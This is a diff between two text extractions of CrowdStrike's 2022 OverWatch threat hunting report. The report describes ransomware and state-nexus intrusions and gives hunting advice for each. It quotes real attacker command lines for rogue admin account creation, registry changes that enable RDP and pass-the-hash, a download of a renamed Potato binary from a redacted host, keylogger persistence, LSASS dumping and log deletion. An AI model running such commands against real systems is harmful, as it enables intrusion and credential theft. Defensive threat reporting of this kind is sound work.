 evasion strategy, seeking to evade automated defenses by using an 
 intermediate tool to deploy and execute ransomware, while ensuring the 
 runner tool is removed to avoid analysis.
 The affiliate conducted light reconnaissance using system commands: 
-C:WINDOWSsystem32cmd.exe c hostname 
-C:WINDOWSsystem32cmd.exe c wmic computersystem get name
+C:\\WINDOWS\\system32\\cmd.exe /c hostname 
+C:\\WINDOWS\\system32\\cmd.exe /c wmic computersystem get name
 The affiliate leveraged the choice command before deleting itself: 
-C:WindowsSystem32cmd.exe C choice CYNDYT 3 \& DelC:Users\[REDACTED]Desktop\[REDACTED].exe
+“C:\\Windows\\System32\\cmd.exe” /C choice /C Y /N /D Y /T 3 \& Del 
+
+“C:\\Users\\\[REDACTED]\\Desktop\\\[REDACTED].exe”
 To proactively hunt for this type of intrusion, defenders should watch for:
-A high volume of unsuccessful logons followed by a successful logon,indicative of a potential brute\-force attack
-RDP sessions established from an external IP
-Unusual binaries written to a user desktop
-Abuse of system binaries, such as wmic and choice, to conduct activity
+ A high volume of unsuccessful logons followed by a successful logon,
+ 
+indicative of a potential brute\-force attack
+ RDP sessions established from an external IP
+ Unusual binaries written to a user desktop
+ Abuse of system binaries, such as wmic and choice, to conduct activity
 11 
-https:docs.microsoft.comen\-uswindows\-serveradministrationwindows\-
-commandschoice
+https://docs.microsoft.com/en\-us/windows\-server/administration/windows\-
+commands/choice
 INITIAL ACCESS
 INITIAL ACCESS
 Afliate gains 
@@ -1473,14 +1514,14 @@ IMPACT
 Afliate makes 
 attempts to delete 
 volume shadow 
-copies this is 
+copies — this is 
 blocked by the 
 Falcon platform
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 26
 Scenario 3
-Another VPN Compromise 
+Another VPN Compromise — 
 Same Password but Fewer Tools
 In Q1 2022, OverWatch uncovered a LockBit intrusion that had 
 parallels to the intrusion attempt described in Scenario 1\. The affiliate 
@@ -1491,28 +1532,28 @@ suspected compromised VPN appliance, the affiliate this time opted to
 use the Windows Management Interface (WMI) to orchestrate activity 
 against a domain controller.
 The affiliate created account over WMI: 
-cmd.exe Q c net user audit \[REDACTED] add domain 
-1\> 127\.0\.0\[.]1ADMIN$\[REDACTED] 2\>\&1
+cmd.exe /Q /c net user audit \[REDACTED] /add /domain 
+1\> \\\\127\.0\.0\[.]1\\ADMIN$\\\_\_\[REDACTED] 2\>\&1
 A newly created account was added to the Domain Admins group:
-cmd.exe Q c net group domain admins audit add 
-domain 1\> 127\.0\.0\[.]1ADMIN$\[REDACTED] 2\>\&1
+cmd.exe /Q /c net group “domain admins” audit /add /
+domain 1\> \\\\127\.0\.0\[.]1\\ADMIN$\\\_\_\[REDACTED] 2\>\&1
 A newly created account was added to the Enterprise Admins group:
-CMD: cmd.exe Q c net group enterprise admins 
-audit add domain 1\> 127\.0\.0\[.]1ADMIN$
+CMD: cmd.exe /Q /c net group “enterprise admins” 
+audit /add /domain 1\> \\\\127\.0\.0\[.]1\\ADMIN$\\\_\_
 \[REDACTED] 2\>\&1
 Next the affiliate switched to using RDP and used the newly created 
 account to connect to the domain controller and move laterally to a 
 backup server, leveraging RDP sessions to conduct further activity 
 including deploying additional tooling. Unlike in Scenario 1, this time 
-the adversary favored the %User%Downloads directory to stage 
+the adversary favored the \\%User%\\Downloads directory to stage 
 tools. The choice of tooling was also different; on this occasion the 
 adversary leveraged the netscan tool, often seen in pre\-ransomware 
 activity, to map the domain. After completing a network scan, the 
 adversary wrote a suspected LockBit binary to the same directory. 
 The affiliate downloaded and executed netscan:
-C:UsersauditDownloadsscannetscan.exe
+C:\\Users\\audit\\Downloads\\scan\\netscan.exe
 The affiliate downloaded LockBit:
-C:UsersauditDownloadsLockBit\_17DE44B4D0BB157C.exe
+C:\\Users\\audit\\Downloads\\LockBit\_17DE44B4D0BB157C.exe
 INITIAL ACCESS
 Afliate gains 
 access via VPN
@@ -1539,7 +1580,15 @@ backup server
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 27
-To proactively hunt for this type of intrusion, defenders should watch for:Newly created privileged accounts over WMINetwork scansscanning toolsInteractive logon to a backup server from a new accountUnexpected RDP sessions to critical servers
+To proactively hunt for this type of intrusion, defenders should watch for:
+ 
+Newly created privileged accounts over WMI
+ 
+Network scans/scanning tools 
+ 
+Interactive logon to a backup server from a new account
+ 
+Unexpected RDP sessions to critical servers
 Scenario 4
 Living off the Land for Data Theft 
 In contrast to the other case studies explored here, this intrusion from Q1 
@@ -1552,14 +1601,14 @@ registry entries and modified registry settings to enable inbound RDP and
 allow PowerShell remoting.
 The affiliate established RDP sessions with other hosts and enabled 
 PowerShell remote sessions:
-mstsc v: \[REDACTED]
-wmic node:\[REDACTED] process call create power
-shell Enable\-PSRemoting \-Force \-SkipNetworkProfileCh
-eck
+mstsc /v: \[REDACTED]
+wmic /node:“\[REDACTED]” process call create “power­
+shell Enable\-PSRemoting \-Force \-SkipNetworkProfileCh­
+eck”
 The affiliate enabled RDP via the registry:
-C:Windowssystem32reg.exe
-ADD HKLMSYSTEMCurrentControlSetControlTerminal 
-Server v fDenyTSConnections t REG\_DWORD d 0 f
+C:\\Windows\\system32\\reg.exe
+ADD “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal 
+Server” /v fDenyTSConnections /t REG\_DWORD /d 0 /f
 OverWatch observed the affiliate leveraging native utilities to execute 
 various host and network reconnaissance commands, including testing 
 connectivity to multiple external IP addresses. Additionally, the affiliate 
@@ -1569,7 +1618,7 @@ During this intrusion, the affiliate once again downloaded and
 executed multiple tools to conduct operations, this time selecting 
 Advanced IP scanner, WinSCP and PuTTY as well as delivering and 
 attempting to execute a StealBit binary. 
-Unlike the previous intrusions, the eCrime affiliates emphasis was 
+Unlike the previous intrusions, the eCrime affiliate’s emphasis was 
 squarely on data theft and extortion. This activity generated a different 
 set of TTPs that demand hunters remain vigilant. Rather than creating 
 any obvious accounts, the affiliate used legitimate access and system 
@@ -1591,7 +1640,7 @@ Afliate gains
  with valid
  accounts
 DEFENSE EVASION
-Afliate modies 
+Afliate modiﬁes 
 the registry to 
 enable inbound 
 RDP sessions 
@@ -1610,7 +1659,7 @@ command
 execution
 Afliate 
 attempts to 
-exltrate data 
+exﬁltrate data 
 using custom 
 StealBit 
 malware, 
@@ -1621,7 +1670,17 @@ Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 28
 To proactively hunt for this type of intrusion, defenders should
-watch for:Manual changes to the registry, specifically to RDP settingsExcessive testing of connectivity to external domainsNewly installed tooling for data transferAbnormal access to sensitive files, such as financial orcredential\-related information
+watch for:
+ 
+Manual changes to the registry, specifically to RDP settings
+ 
+Excessive testing of connectivity to external domains
+ 
+Newly installed tooling for data transfer 
+ 
+Abnormal access to sensitive files, such as financial or
+ 
+credential\-related information
 Action Items for Defenders 
 There is no one\-size\-fits\-all model when it comes to how ransomware affiliates conduct intrusions, nor is there a single silver 
 bullet for organizations to defend themselves against every intrusion. However, by looking at how intrusions overlap, it is 
@@ -1661,7 +1720,7 @@ Over the past year, countless tools were written and distributed across the
 information security and adversary communities. The majority of these tools 
 went unnoticed and largely unused, but a handful have been adopted and 
 OverWatch is now seeing them used in active intrusions. Studying these 
-tools gives threat hunters clues about the direction of adversary activity.
+tools gives threat hunters clues about the direction of adversary activity. 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 30
@@ -1681,9 +1740,9 @@ with one of the following options are likely to be a renamed fscan binary:
 \`\-nopoc\` \- Disable web vuln scan 
 \`\-np\` \- Disable Ping 
 As seen in these command line examples:
-.exp1orer6 \-h 10\.68\.59\.42 \-user root \-pwd \[REDACTED] \-nopoc \-c ping \-c 2 \[REDACTED]
-.fs \-h 192\.168\.152\.124 \-np \-nopoc
-fscan.exe \-h 10\.227\.156\.024 \-nopoc \-np \-p 80,135,139,443,445,1433,3306,5432,6379,7001,8000
+./exp1orer6 \-h 10\.68\.59\.42 \-user root \-pwd \[REDACTED] \-nopoc \-c ping \-c 2 \[REDACTED]
+./fs \-h 192\.168\.152\.1/24 \-np \-nopoc
+fscan.exe \-h 10\.227\.156\.0/24 \-nopoc \-np \-p 80,135,139,443,445,1433,3306,5432,6379,7001,8000
 ,8080,3389
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
@@ -1694,23 +1753,41 @@ In the Wild
 Adversaries are using IceApple to gain further objectives after they have already established a foothold in an environment. 
 This framework is incredibly hard to detect because it leverages reflectively loaded .NET assemblies and resides in memory, 
 maintaining a low forensic footprint. Because IceApple is loaded into existing processes, defenders do not see a malicious or 
-uncommon process running they will only see a legitimate application like a web server connecting out to a suspicious IP. 
-There are 18 modules that can be used within the IceApple framework. Below are examples of the more impactful modules:\+
-Writing data to a file\+
-Deleting files and directories\+
-Retrieving IIS server variables\+
-Dumping credentials stored in registry keys on the infected host or a remote host\+
-Executing queries against Active Directory Normal exfiltrating of files\+
-Performing special exfiltration of files including large files and several files at a time via a separate HTTP listener 
+uncommon process running — they will only see a legitimate application like a web server connecting out to a suspicious IP. 
+There are 18 modules that can be used within the IceApple framework. Below are examples of the more impactful modules:
+ 
+\+
+Writing data to a file 
+ 
+\+
+Deleting files and directories 
+ 
+\+
+Retrieving IIS server variables 
+ 
+\+
+Dumping credentials stored in registry keys on the infected host or a remote host
+ 
+\+
+Executing queries against Active Directory “Normal” exfiltrating of files 
+ 
+\+
+Performing special exfiltration of files — including large files and several files at a time — via a separate HTTP listener 
 OverWatch Observations
 OverWatch regularly sees adversaries use .NET assemblies as a way to load additional functionality post\-exploitation. As such, 
 OverWatch threat hunters have been actively developing detections for reflective .NET assembly loads.
-In late 2021, one of OverWatchs in\-development detections for reflective .NET assembly loads triggered on a Microsoft Exchange 
+In late 2021, one of OverWatch’s in\-development detections for reflective .NET assembly loads triggered on a Microsoft Exchange 
 OWA server belonging to a customer that had recently started a trial of the Falcon platform. Eagle\-eyed threat hunters identified 
 anomalies in the assembly files and quickly notified the victim organization.
-OverWatch hunters were able to leverage their understanding of standard application behaviors to identify these anomalies:\+
-IIS does not reflectively load its generated temporary .NET assemblies from byte arrays.\+
-Microsoft Exchange does not reflectively load its .NET assemblies from byte arrays.\+
+OverWatch hunters were able to leverage their understanding of standard application behaviors to identify these anomalies: 
+ 
+\+
+IIS does not reflectively load its generated temporary .NET assemblies from byte arrays. 
+ 
+\+
+Microsoft Exchange does not reflectively load its .NET assemblies from byte arrays. 
+ 
+\+
 The last eight characters of IIS temporary file names are randomly generated; however, the same four .NET assembly names 
 were seen multiple times.
 Discovered by OverWatch,
@@ -1720,7 +1797,7 @@ the past year indicates that this framework remains under active development.
 Reflectively loading .NET assemblies, which involves executing the assembly directly within the memory of a process, can be a 
 powerful and potentially stealthy way for adversaries to pursue their mission objectives.
 13 
-For a detailed discussion of IceApple and the functionality of its modules, see OverWatchs research paper on the topic,
+For a detailed discussion of IceApple and the functionality of its modules, see OverWatch’s research paper on the topic,
 Ice Apple: A Novel Internet Information Services (IIS) Post\-Exploitation Framework.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
@@ -1728,30 +1805,33 @@ CrowdStrike
 Sweet Potato
 (and Other Potato Variations)
 Privilege Escalation
-In 2016, a privilege escalation vulnerability known as Hot Potato was discovered within the Windows operating system. The 
+In 2016, a privilege escalation vulnerability known as “Hot Potato” was discovered within the Windows operating system. The 
 fundamental concept is to force a system to authenticate and capture the security token. Over time, variations of this technique 
-were created with similar names such as Juicy Potato, Lonely Potato and Rogue Potato but relied on the same underlying 
-method of capturing credentials in transit. More recently in 2020, a script called Sweet Potato was written to bundle multiple 
+were created with similar names — such as “Juicy Potato,” “Lonely Potato” and “Rogue Potato” — but relied on the same underlying 
+method of capturing credentials in transit. More recently in 2020, a script called “Sweet Potato” was written to bundle multiple 
 Potato exploits, which can be run standalone or through attack frameworks such as PowerShell Empire and Cobalt Strike.
 Overview of method:
-1\. Forces NT AUTHORITYSYSTEM to authenticate via NTLM 
-1\. Captures authentication attempt to acquire security token 
-1\. Impersonates if the account will allow it (the account must have SeImpersonatePrivilege rights)
+1\. 
+Forces NT AUTHORITY/SYSTEM to authenticate via NTLM 
+2\. 
+Captures authentication attempt to acquire security token 
+3\. 
+Impersonates if the account will allow it (the account must have SeImpersonatePrivilege rights)
 In the Wild
 Despite variations of this tool dating back to 2016, it continues to find a place in adversary toolkits due to consistent innovation and 
-ease of use. As with so many other exploitation tools, a push to one\-click solutions lowers the barrier to entry for adversaries and 
+ease of use. As with so many other exploitation tools, a push to “one\-click” solutions lowers the barrier to entry for adversaries and 
 can make it easier for adversary groups to standardize procedures. 
 OverWatch Observations
 Sweet Potato is a collection of scripts that can be staged and downloaded from any adversary\-controlled domain or IP. OverWatch 
-often sees the binary renamed as its downloaded to the victim host, and as a result, hash identification is useful for locating Potato 
+often sees the binary renamed as it’s downloaded to the victim host, and as a result, hash identification is useful for locating Potato 
 binaries. 
 Example of a renamed Potato binary:
 powershell Invoke\-WebRequest \-Uri
-"http:
-\[REDACTED]kumpir
+"http:/
+/\[REDACTED]/kumpir
 .exe" \-OutFile
 "c:
-userspublickumpir
+\\users\\public\\kumpir
 .exe"
 Trending Tools
 In many cases, it takes time for adversaries to adopt new techniques 
@@ -1783,7 +1863,7 @@ Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 34
 Mainstay Tools
-These tools are not new or increasing in use they have been 
+These tools are not new or increasing in use — they have been 
 constantly used by attackers over the last few years, and OverWatch 
 continues to see them in intrusions. While these may not be the new 
 shiny items on the scene, it is important to remember that adversaries 
@@ -1801,14 +1881,14 @@ the lookout for hacking tools. Once the software is installed, they use it to ga
 access is denied. These tools also have the capability to send files directly to a victim host from an attacker controlled machine. 
 This allows for stealthy transfer of additional malicious files.
 OverWatch Observations
-These tools are legitimate applications and are hosted on the companys websites. OverWatch observes them being downloaded 
+These tools are legitimate applications and are hosted on the company’s websites. OverWatch observes them being downloaded 
 from the official websites in the same way a typical user would acquire the software. Once the executable is downloaded, it is 
 installed through the standard MSI method for applications. In other cases, it can be installed as a service or built into a scheduled 
 task for persistence.
-powershell \-c (New\-Object Net.WebClient).DownloadFile('hxxp:download.anydesk\[.]com
+powershell \-c (New\-Object Net.WebClient).DownloadFile('hxxp://download.anydesk\[.]com/
 AnyDesk.msi', 'AnyDesk.msi')
-C:Program Files (x86\)TeamViewerTeamViewer\_Service.exe" \-install
-C:Program Files (x86\)AnyDeskAnyDesk.exe" service
+C:\\Program Files (x86\)\\TeamViewer\\TeamViewer\_Service.exe" \-install
+C:\\Program Files (x86\)\\AnyDesk\\AnyDesk.exe" \-\-service
 Service Installation
 This PowerShell command is reaching out to the AnyDesk site to pull down a legitimate executable.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -1838,11 +1918,11 @@ that are difficult to detect. Cobalt Strike is the gold standard for adversary s
 combat new defenses and detection methods. 
 OverWatch Observations
 Cobalt Strike can be difficult to detect because of its ability to generate new implants to bypass defensive controls. For implants 
-to work correctly, they must beacon out to a control server this communication is one of the ways that OverWatch detects 
-these implants. Another method for detecting the implant is to find installationcreation of the implant on the target machine. 
+to work correctly, they must beacon out to a control server — this communication is one of the ways that OverWatch detects 
+these implants. Another method for detecting the implant is to find installation/creation of the implant on the target machine. 
 A PowerShell script creating a Cobalt Strike Beacon:
-"C:WindowsSystem32notepad.exe" "tsclientZNew Text Document.ps1"
-"C:WindowsSystem32WindowsPowerShellv1\.0powershell\_ise.exe" "tsclientZNew Text 
+"C:\\Windows\\System32\\notepad.exe" "\\\\tsclient\\Z\\New Text Document.ps1"
+"C:\\Windows\\System32\\WindowsPowerShell\\v1\.0\\powershell\_ise.exe" "\\\\tsclient\\Z\\New Text 
 Document.ps1"
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
@@ -1853,7 +1933,7 @@ Complete Team Up to
 Deliver Immediate Time\-
 to\-Value 
 OverWatch continuous threat hunting is an integral part of the CrowdStrike Falcon 
-Complete managed detection and response service. OverWatch threat hunters 
+Complete™ managed detection and response service. OverWatch threat hunters 
 collaborate closely with their counterparts in Falcon Complete, exchanging information 
 about their respective discoveries to facilitate both deeper investigation and rapid 
 remediation. It is not uncommon for new customers to experience the power of this 
@@ -1864,19 +1944,19 @@ Exchange Server. The server was running a w3wp.exe (IIS worker) process with
 the MSExchangeAutodiscoverAppPool application pool. Interestingly, the server 
 connected to another host on the network over Server Message Block (SMB) 
 protocol. While OverWatch only had limited data at this point, threat hunters were 
-able to identify the activity as rare within the global OverWatch telemetry which 
+able to identify the activity as rare within the global OverWatch telemetry — which 
 made it immediately suspicious.
 Further activity on the compromised server revealed the presence of a low footprint 
 intrusion, likely conducted by a state\-nexus adversary. This activity included the presence 
 of suspicious files indicative of likely web shell activity, including .aspx files and a temporary 
-Visual Basic .NET file unique within the OverWatch dataset. Upon further investigation, 
+Visual Basic .NET file — unique within the OverWatch dataset. Upon further investigation, 
 evidence was discovered of an account set up with Application Impersonation privileges, 
 which is particularly concerning as this enables applications or users to impersonate 
 other users in an organization to perform tasks on behalf of the user.
 14 This can be used to 
 maliciously collect email data, as was likely the case in this particular incident.
 14 
- https:docs.microsoft.comen\-usexchangedata\-loss\-prevention\-role\-exchange\-2013\-help 
+ https://docs.microsoft.com/en\-us/exchange/data\-loss\-prevention\-role\-exchange\-2013\-help 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 37
@@ -1884,15 +1964,15 @@ OverWatch immediately notified the customer of the suspicious activity the
 hunters had uncovered. This led the new customer to upgrade their subscription 
 to the Falcon Complete service. Falcon Complete analysts were then able to take 
 immediate action to stop and remediate this attack on behalf of the customer. With 
-the victim organizations approval, Falcon Complete analysts leveraged the Falcon 
-Real Time Response (RTR) capability to investigate the Exchange Server logs 
+the victim organization’s approval, Falcon Complete analysts leveraged the Falcon 
+Real Time Response (RTR) capability to investigate the Exchange Server logs — 
 finding further evidence that the initial infection was the exploitation of an Exchange 
 vulnerability. Falcon RTR also provided analysts the ability to surgically remove the 
 web shell files, which were identified in the following directories:
-C:Program FilesMicrosoftExchange ServerV15ClientAccess
-Autodiscover
-C:Program FilesMicrosoftExchange ServerV15FrontEnd
-HttpProxyowaauthCurrentscriptspremium
+C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\
+Autodiscover\\
+C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\
+HttpProxy\\owa\\auth\\Current\\scripts\\premium\\
 Falcon Complete also provided the customer with recommendations to further 
 harden the environment. This included patching Exchange on the vulnerable server, 
 performing a domain\-wide password reset, ensuring multifactor authentication is 
@@ -1900,7 +1980,7 @@ enabled on all email accounts and remote admin access services, and deploying th
 Falcon sensor across the environment.
 No organization plans to test its security services against a hands\-on state\-
 nexus adversary. However, for this organization, the move to CrowdStrike 
-proved timely Falcon OverWatch and Falcon Complete worked together to 
+proved timely — Falcon OverWatch and Falcon Complete worked together to 
 identify and remediate a stealthy intrusion that had previously gone undetected. 
 The vigilance and expertise of OverWatch and Falcon Complete provided 
 this organization with immediate time\-to\-value and confidence that they had 
@@ -1910,18 +1990,18 @@ Nowhere to Hide: OverWatch Threat Hunting Insights, 2022
 CrowdStrike
 38
 OverWatch threat hunters are regularly exposed to the cutting edge 
-of adversary tradecraft and this past year was no exception. 
+of adversary tradecraft — and this past year was no exception. 
 Adversaries are continuing to evolve their tradecraft as they strive 
 to bypass even the most sophisticated technology\-based defense 
 systems. 
 OverWatch threat hunters are developing their hunting operations 
-alongside these changes in adversarial behavior meeting the 
+alongside these changes in adversarial behavior — meeting the 
 adversary exactly where they are, successfully unearthing even the 
 most novel malicious activity. 
 The following section details some of the most interesting adversarial 
 tradecraft OverWatch has discovered over the past year. It highlights 
-the strengths of OverWatchs hunting abilities and showcases how 
-determined todays adversaries are at achieving their actions on 
+the strengths of OverWatch’s hunting abilities and showcases how 
+determined today’s adversaries are at achieving their actions on 
 objectives. 
 Looking Deeper
 Interesting
@@ -1951,24 +2031,24 @@ Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 40
 OverWatch found evidence of multiple actors present in 
-the victims network, including activity attributed with high 
+the victim’s network, including activity attributed with high 
 confidence to the China\-nexus threat actor AQUATIC PANDA 
- the focus of this case study. 
+— the focus of this case study. 
 The malicious interactive activity was discovered as part of 
-OverWatchs 247365 human\-driven threat hunting operations 
+OverWatch’s 24/7/365 human\-driven threat hunting operations 
 and was consistent with targeted intrusion operations. 
 AQUATIC PANDA was tracked using several distinct TTPs that 
 were consistent with a well\-established actor. Demonstrating 
-the actors cross\-platform proficiency, the malicious activity 
+the actor’s cross\-platform proficiency, the malicious activity 
 extended across both Windows and Linux hosts. The actor was 
-aggressive in their efforts deploying an extensive selection 
+aggressive in their efforts — deploying an extensive selection 
 of tooling in pursuit of their actions on objectives, including 
 credential dumpers, keyloggers, the remote access trojan 
 ShadowPad, and Winnti, which provides the ability to tunnel 
-implant traffic between multiple infected hosts allowing an 
+implant traffic between multiple infected hosts — allowing an 
 actor to maintain access to a large number of infected hosts 
-through a single entryegress implant on an external\-facing host.
-The actor moved quickly through the victim organizations 
+through a single entry/egress implant on an external\-facing host.
+The actor moved quickly through the victim organization’s 
 network without obstruction using several privileged user 
 accounts coupled with multiple points of entry to achieve 
 persistent access into the network. 
@@ -1979,7 +2059,7 @@ Microsoft .NET
 Runtime Crash Dump 
 Generator to dump 
 LSASS process 
-memory, and modied 
+memory, and modiﬁed 
 the registry to enable 
 RDP pass\-the\-hash
 DEFENSE EVASION
@@ -1992,7 +2072,7 @@ compression using
 rar
 .exe to archive the 
 collected data ready 
-for exltration
+for exﬁltration
 LATERAL MOVEMENT
 The actor moved
  freely using 
@@ -2003,7 +2083,7 @@ and Windows Admin
 Shares
 PERSISTENCE
 The ld.so.preload 
-le was modied to 
+ﬁle was modiﬁed to 
 enable persistence for 
 Winnti on Linux hosts. 
 On Windows, new 
@@ -2012,11 +2092,11 @@ masqueraded as
 legitimate Windows 
 processes, and 
 scheduled tasks were 
-used to run the actors 
+used to run the actor’s 
 keylogger
 Eforts to remain covert 
 included log clearing, 
-tampering and le 
+tampering and ﬁle 
 deletion, removal of 
 actor\-created user 
 accounts, and renaming 
@@ -2041,19 +2121,19 @@ The use of implants is a favored way for targeted intrusion adversaries to maint
 to a network, as is the abuse of legitimate signed executables to facilitate their execution. 
 AQUATIC PANDA used the legitimate Windows Security Health Service executable 
 SecurityHealthService.exe to load a malicious DLL before creating a new service with 
-the display name Windows User Service in a deliberate attempt to have it blend in as an 
+the display name “Windows User Service” in a deliberate attempt to have it blend in as an 
 innocuous operating system service, as shown in the below command line.
-sc create WpnUserService\_10e316 binpath\= cmd.exe c start 
-C:ProgramdataMicrosoftCryptoKeysSecurityHealthService.exe 
-start\= auto obj\= localsystem displayname\= Windows User Service
+sc create WpnUserService\_10e316 binpath\= “cmd.exe /c start 
+C:\\Programdata\\Microsoft\\Crypto\\Keys\\SecurityHealthService.exe” 
+start\= auto obj\= localsystem displayname\= “Windows User Service”
 Similar activity was also observed on a neighboring host, where the actor leveraged a 
 remotely created scheduled task to install the same implant.
 Implant deployment activity continued on Linux hosts, where the actor established 
 an interactive session on one host via SSH.
 15 Operating as the root user, the actor 
 executed a shell script resulting in the installation of the Linux version of Winnti. The 
-installation comprised two components, a Winnti executable (liblibxselinux) and 
-a second executable, likely an Azazel sample(liblibxselinux.so). Additionally, 
+installation comprised two components, a Winnti executable (/lib/libxselinux) and 
+a second executable, likely an Azazel sample (/lib/libxselinux.so). Additionally, 
 the aforementioned script attempted to modify ld.so.preload in a likely attempt to 
 persist the backdoor using the dynamic linker hijacking technique.
 16 The execution of the 
@@ -2062,13 +2142,13 @@ had previously been identified by CrowdStrike Intelligence as likely C2 infrastr
 associated with ShadowPad, a malware family commonly associated with China\-nexus 
 targeted intrusion adversaries.
 The actor attempted to cover their tracks by deleting the Winnti install script and clearing 
-SSH authentication logs by using rm to delete varlogsecure. In an additional step, the 
+SSH authentication logs by using rm to delete var/log/secure. In an additional step, the 
 actor used the last command to view information about recently logged\-in users before 
 manipulating the wtmp file to remove selected entries to conceal their activity.
 15 
- https:attack.mitre.orgtechniquesT1021004
+ https://attack.mitre.org/techniques/T1021/004/
 16 
- https:attack.mitre.orgtechniquesT1574006
+ https://attack.mitre.org/techniques/T1574/006/
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 42
@@ -2080,7 +2160,7 @@ Hijacking the dynamic linker on a Linux\-based system provides the adversary wit
 to load malicious code by hijacking the environment variables used by the dynamic linker 
 to load shared libraries. The libraries defined in the environment variables take precedence 
 over system libraries in terms of load order, which presents an opportunity for an adversary 
-to tamper with either LD\_PRELOAD or the etcld.so.preload file, configuring it to point 
+to tamper with either LD\_PRELOAD or the /etc/ld.so.preload file, configuring it to point 
 to a malicious library in place of the legitimate library.
 How Adversaries Leverage This Technique: The Dynamic Linker Hijacking technique 
 allows an adversary to load arbitrary code upon execution of the linked legitimate process. 
@@ -2091,12 +2171,12 @@ Linker Hijacking technique presents a unique challenge for defenders relying sol
 technology\-based controls, due to the injection of malicious code into a legitimate process. 
 Human\-led threat hunting provides defenders with the timely discovery of behaviors and 
 activities associated with the use of this persistence technique, including proactively 
-searching for attempts to modify the etcld.so.preload file, and the use of the chattr 
-command to either set or unset Linux file attributes specifically, the \+i attribute, which 
+searching for attempts to modify the /etc/ld.so.preload file, and the use of the chattr 
+command to either set or unset Linux file attributes — specifically, the \+i attribute, which 
 sets a file as immutable and therefore unable to be modified.
 17 
  For more information on this technique, see the MITRE website:
- https:attack.mitre.orgtechniquesT1574006\. 
+ https://attack.mitre.org/techniques/T1574/006/. 
 PERSISTENCE
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
@@ -2110,9 +2190,9 @@ registry key to enable a feature known as RestrictedAdmin mode, shown in the com
 line below. This feature was originally introduced by Microsoft to prevent the transmission 
 of reusable credentials to the remote systems when connecting via RDP. This in turn 
 prevents credentials being harvested during the initial connection process if the remote 
-server has been compromised to mitigate against pass the hash18 attacks.
-REG ADD HKLMSystemCurrentControlSetControlLsa v 
-DisableRestrictedAdmin t REG\_DWORD d 00000000 f
+server has been compromised to mitigate against “pass the hash”18 attacks.
+REG ADD “HKLM\\System\\CurrentControlSet\\Control\\Lsa” /v 
+DisableRestrictedAdmin /t REG\_DWORD /d 00000000 /f
 Interestingly, this registry feature introduces the ability to pass the hash to RDP. In this case, 
 it opens the door for the actor to be able to authenticate via RDP using a valid account 
 name and hash without requiring an unhashed or cleartext password.
@@ -2124,24 +2204,26 @@ execution of a malicious DLL file identified by CrowdStrike Intelligence as a ke
 binary.The keylogging binary was executed by way of a scheduled task,21 which was 
 configured to run on logon under the context of a valid user account, as shown in the below 
 command line example.
-schtasks create TN MicrosoftWindowsWindowsUpdateWindowsKeys TRC:Windowssystem32Rundll32\.exe 
-c:users\[REDACTED]AppDataLocalMicrosoftWindows0keys.
-dll,Update SC ONLOGON RU \[REDACTED]
+schtasks /create /TN \\Microsoft\\Windows\\WindowsUpdate\\WindowsKeys /TR 
+
+“C:\\Windows\\system32\\Rundll32\.exe 
+c:\\users\\\[REDACTED]\\AppData\\Local\\Microsoft\\Windows\\0\\keys.
+dll,Update” /SC ONLOGON /RU \[REDACTED]
 The resulting output of the keylogger execution was subsequently written to the directory 
 C:
-UsersPublicMicrosoftSystemUpdate likely in preparation for exfiltration.
+\\Users\\Public\\Microsoft\\System\\Update likely in preparation for exfiltration.
 18 
 For more information on this technique, see the MITRE website:
-https:attack.mitre.orgtechniquesT1550002\.
+https://attack.mitre.org/techniques/T1550/002/.
 19 
 For more information on this technique, see the MITRE website:
-https:attack.mitre.orgtechniquesT1218011\.
+https://attack.mitre.org/techniques/T1218/011/.
 20 
 For more information on this technique, see the MITRE website:
-https:attack.mitre.orgtechniquesT1056001\.
+https://attack.mitre.org/techniques/T1056/001/.
 21 
 For more information on this technique, see the MITRE website:
-https:attack.mitre.orgtechniquesT1053005\.
+https://attack.mitre.org/techniques/T1053/005/.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 44
@@ -2153,51 +2235,51 @@ cdump.exe \-u \-f tempdmp.dmp 192
 Additionally, the actor used the Windows Task Manager to dump the contents of LSASS 
 process memory before using the open source file archiving utility23 7\-Zip to compress the 
 output file, again in readiness for a likely exfiltration attempt:
-C:
-Program Files7\-Zip7zG.exe a \-i\#7zMap5454:110:7zEvent5987 \-t7z \-sae 
- C:
-Users\[REDACTED]AppDataLocalTemp3lsass.7z
+“C:
+\\Program Files\\7\-Zip\\7zG.exe” a \-i\#7zMap5454:110:7zEvent5987 \-t7z \-sae 
+\-\- “C:
+\\Users\\\[REDACTED]\\AppData\\Local\\Temp\\3\\lsass.7z”
 Pivoting Without Obstruction
-The deeply entrenched nature of AQUATIC PANDAs access into the victim organizations 
+The deeply entrenched nature of AQUATIC PANDA’s access into the victim organization’s 
 network along with their possession of privileged domain level credentials allowed them 
 to move freely between hosts without obstruction, leveraging a kit of remote services 
 including RDP, SSH and Windows Admin Shares24 to facilitate lateral movement in pursuit 
 of their actions on objectives.
 Laying the Groundwork for Exfiltration
-AQUATIC PANDAs data collection operations included the gathering of sensitive files, 
+AQUATIC PANDA’s data collection operations included the gathering of sensitive files, 
 credential\-related information and log data, culminating in the archiving of this data likely as 
 a precursor to exfiltration attempts.
 As part of these collection operations, the actor showed an interest in Windows security 
 event log data and was observed using the Microsoft wevtutil utility to extract these events 
 into an .evtx output file:
 wevtutil epl Security c:
